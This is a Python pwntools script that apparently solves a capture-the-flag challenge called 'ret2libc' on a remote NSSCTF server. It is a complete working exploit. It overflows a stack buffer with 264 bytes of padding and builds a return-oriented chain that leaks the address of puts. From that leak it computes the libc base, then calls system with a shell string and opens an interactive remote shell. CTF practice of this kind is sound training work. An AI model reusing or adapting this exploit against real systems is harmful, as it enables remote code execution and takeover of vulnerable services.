from pwn import*

context.update(arch='amd64',os='linux')
context.terminal=['-e','qterminal']
context.log_level='debug'
elf=ELF('./ret2libc')
rdi_ret=p64(0x401273)
ret=p64(0x401274)

p=remote('node5.anna.nssctf.cn',28487)

paylaod=b'a'*264+rdi_ret+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(0x40117A)

p.sendline(paylaod)
puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
log.info("addr= %#x" % (puts_addr))
libc=puts_addr-0x084420
paylaod=b'a'*264+ret+rdi_ret+p64(libc+0x1b45bd)+p64(libc+0x052290)
p.sendline(paylaod)
p.interactive()